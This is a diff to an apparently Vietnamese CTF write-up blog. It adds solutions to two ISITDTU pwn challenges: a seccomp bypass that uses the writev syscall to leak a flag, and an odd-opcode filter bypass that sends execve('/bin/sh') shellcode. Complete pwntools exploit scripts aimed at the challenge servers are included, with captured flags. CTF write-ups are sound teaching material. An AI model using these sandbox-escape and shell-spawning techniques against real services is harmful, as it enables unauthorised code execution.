@@ -563,6 +563,107 @@ Lúc này, mình tìm xung quanh các thanh ghi **`rcx`** để xem nó bị ả
 
 Đưa **`rcx`** trỏ về đây, chạy nốt chương trình và thu được flag **`ISITDTU{STATIC_STRUCt_INITIALIZATION_FAiLED}`**
 
+## pwn/shellcode 1
+
+{{< admonition note "Challenge Information" >}}
+* 68 solves / 100 pts / by code016hiro
+* **Given files:** [shellcode1.rar](https://wru-my.sharepoint.com/:u:/g/personal/2251272678_e_tlu_edu_vn/ERrQb5blRN1IgofOJUmPwBwBROdWJxB03jdYp0yTbzcfGg?e=UTPFbg)
+* **Description:** **`nc 152.69.210.130 3001`**
+{{< /admonition >}}
+
+**Solution**
+
+Về tổng quan, chương trình đọc flag, lưu nó trên 1 vùng nhớ được **`mmap`** rồi xóa flag đó đi. Chương trình tiếp tục **`mmap`** một vùng nhớ mới cho shellcode với full quyền rwx và cho phép chúng ta chạy shellcode đó. 
+
+<img src="25.png"/>
+
+Khi nhảy vào shellcode, check **`vmmap`**, ta có thể thấy được vùng nhớ lưu flag nằm ngay dưới shellcode và cách nhau 0x1000 byte. Vậy nếu ta sử dụng được syscall **`write`** thì hoàn toàn có thể đọc được flag. 
+
+<img src="26.png"/>
+
+Kiểm tra seccomp, ta thấy các syscall như **`read`**, **`write`**, **`open`**, **`execve`**, **`openat`** đều không được phép sử dụng.
+
+```shell
+❯ seccomp-tools dump ./challenge
+Some gift for you: 0x7fd1042216f0
+
+ line  CODE  JT   JF      K
+=================================
+ 0000: 0x20 0x00 0x00 0x00000004  A = arch
+ 0001: 0x15 0x00 0x0a 0xc000003e  if (A != ARCH_X86_64) goto 0012
+ 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
+ 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
+ 0004: 0x15 0x00 0x07 0xffffffff  if (A != 0xffffffff) goto 0012
+ 0005: 0x15 0x06 0x00 0x00000000  if (A == read) goto 0012
+ 0006: 0x15 0x05 0x00 0x00000001  if (A == write) goto 0012
+ 0007: 0x15 0x04 0x00 0x00000002  if (A == open) goto 0012
+ 0008: 0x15 0x03 0x00 0x0000003b  if (A == execve) goto 0012
+ 0009: 0x15 0x02 0x00 0x000000f0  if (A == mq_open) goto 0012
+ 0010: 0x15 0x01 0x00 0x00000101  if (A == openat) goto 0012
+ 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW
+ 0012: 0x06 0x00 0x00 0x00000000  return KILL
+ ```
+
+ Để bypass được các hạn chế phía trên, mình sẽ sử dụng syscall **`writev`** thay thế cho **`write`** để đọc flag.
+
+ ```c
+ ssize_t writev(int fd, const struct iovec *iov, int iovcnt)
+ ``` 
+ trong đó **`iovec`** có cấu trúc như sau 
+ ```c
+ struct iovec {
+    void  *iov_base;    /* Starting address */
+    size_t iov_len;     /* Number of bytes to transfer */
+};
+```
+Vậy mình sẽ chỉ định cho **`iov_base`** là địa chỉ vùng nhớ chứa flag, **`iov_len`** là 0x100. 
+
+Khi nhảy vào shellcode, **`rdx`** chứa giá trị của địa chỉ shellcode. Vậy nên địa chỉ của vùng nhớ flag sẽ là **`rdx + 0x1000`**. 
+
+```python
+#!/usr/bin/env python3
+
+from pwn import *
+
+exe = ELF("./challenge_patched")
+libc = ELF("./libc.so.6")
+ld = ELF("./ld-linux-x86-64.so.2")
+
+context.update(os = "linux", arch = "amd64", log_level = "debug", terminal = "cmd.exe /c start wsl".split(), binary = exe)
+
+# p = process(exe.path)
+p = remote("152.69.210.130", 3001)
+
+sl  = p.sendline
+sa  = p.sendafter
+sla = p.sendlineafter
+rl  = p.recvline
+ru  = p.recvuntil
+
+ru(b"Some gift for you: ")
+
+libc_leak = int(rl().strip(), 16) 
+libc_base = libc_leak - libc.symbols["printf"]
+log.info(f"libc leak = {hex(libc_leak)}")
+
+payload = asm("""
+    add rdx, 0x1000      
+    mov rax, 0x100
+    push rax         
+    push rdx          
+    mov rdi, 1 
+    mov rsi, rsp 
+    mov rdx, 1                                 
+    mov rax, 0x14
+    syscall           
+""")
+
+p.send(payload)
+
+p.interactive() 
+# ISITDTU{061e8c26e3cf9bfad4e22879994048c8257b17d8}
+```
+
 ## pwn/shellcode 2
 
 {{< admonition note "Challenge Information" >}}
@@ -571,6 +672,90 @@ Lúc này, mình tìm xung quanh các thanh ghi **`rcx`** để xem nó bị ả
 * **Description:** **`nc 152.69.210.130 3002`**
 {{< /admonition >}}
 
+**Solution**
+
+Decompile file đề bài cho bằng IDA64, ta có thể thấy chương trình **`mmap`** cho vùng nhớ ở địa chỉ 0xAABBCC00 kích thước 0x1000 byte với full quyền rwx. 
+
+```c
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  int i; // [rsp+Ch] [rbp-4h]
+
+  init(argc, argv, envp);
+  read_flag();
+  addr = mmap((void *)0xAABBCC00LL, 0x1000uLL, 7, 34, -1, 0LL);
+  if ( addr == (void *)-1LL )
+  {
+    perror("mmap");
+    return 1;
+  }
+  else
+  {
+    puts(">");
+    read(0, addr, 0x1000uLL);
+    for ( i = 0; i <= 4095; ++i )
+    {
+      if ( (*((_BYTE *)addr + i) & 1) == 0 )
+        *((_BYTE *)addr + i) = 0x90;
+    }
+    ((void (*)(void))addr)();
+    return 0;
+  }
+}
+```
+
+Những opcode chẵn trong shellcode sẽ bị thay đổi thành **`nop`** làm cho nó không hoạt động được.
+
+Có một bài [write-up](https://github.com/peace-ranger/CTF-WriteUps/tree/main/2022/UIUCTF/odd-shell) của giải UIUCTF 2022 nói rất chi tiết về việc build lại toàn bộ các instruction với opcode lẻ cần thiết cho việc lấy shell mà các bạn có thể tham khảo. Mình sẽ giải bài này với hướng tiếp cận khác so với write-up phía trên.  
+
+Chúng ta có thể thấy, khi chương trình chuẩn bị nhảy vào shellcode, các giá trị của các thanh ghi như **`rax`**, **`rdi`**, **`rsi`** và **`rdx`** đều hợp lệ cho việc gọi syscall **`read`**.
+
+<img src="24.png"/>
+
+Vậy payload đầu tiên chúng ta chỉ cần gọi **`syscall`** để chương trình tiếp tục được nhập input lần thứ hai. Vì đã pass qua vòng **`for`** check opcode chẵn lẻ, nên tại lần nhập thứ hai này, ta chỉ cần viết shellcode lấy shell như thông thường. 
+
+```python
+#!/usr/bin/env python3
+
+from pwn import *
+
+exe = ELF("./challenge") 
+# libc = ELF("./libc.so.6")
+# ld = ELF("./ld-2.35.so")
+
+context.update(os = "linux", arch = "amd64", log_level = "debug", terminal = "cmd.exe /c start wsl".split(), binary = exe)
+
+# p = process(exe.path)
+p = remote("152.69.210.130", 3002)
+
+sl  = p.sendline
+sa  = p.sendafter
+sla = p.sendlineafter
+rl  = p.recvline
+ru  = p.recvuntil
+
+payload1 = asm("""
+    syscall 
+""")
+sa(b">\n", payload1)
+
+payload2 = asm("""
+    nop
+    nop
+    mov rax, 0x68732f6e69622f
+    push rax
+    mov rdi, rsp 
+    xor rsi, rsi
+    xor rdx, rdx
+    mov rax, 0x3b
+    syscall
+""")
+p.send(payload2)
+
+p.interactive() 
+# ISITDTU{95acf3a6b3e1afc243fbad70fbd60a6be00541c62c6d651d1c10179b41113bda}
+```
+ 
 ---
 
 # List challenges
@@ -588,14 +773,6 @@ rev/FlagCpp
 * 6 solves / 486 pts / by ks75vl
 * **Given files:** [FlagCpp_5C9F861EFCC1AFF273C435E3CC988438.zip](https://wru-my.sharepoint.com/:u:/g/personal/2251272678_e_tlu_edu_vn/EVxUcWswr9dDpgp6dliEmegBuIlCMyD9yrrI2shOlmwArw?e=mwWGaf)
 * **Description:** Trust me, this program was written in **`C++`**.
-{{< /admonition >}}
-
-pwn/shellcode 1
-
-{{< admonition note "Challenge Information" >}}
-* 68 solves / 100 pts / by code016hiro
-* **Given files:** [shellcode1.rar](https://wru-my.sharepoint.com/:u:/g/personal/2251272678_e_tlu_edu_vn/ERrQb5blRN1IgofOJUmPwBwBROdWJxB03jdYp0yTbzcfGg?e=UTPFbg)
-* **Description:** **`nc 152.69.210.130 3001`**
 {{< /admonition >}}
 
 pwn/Game of Luck
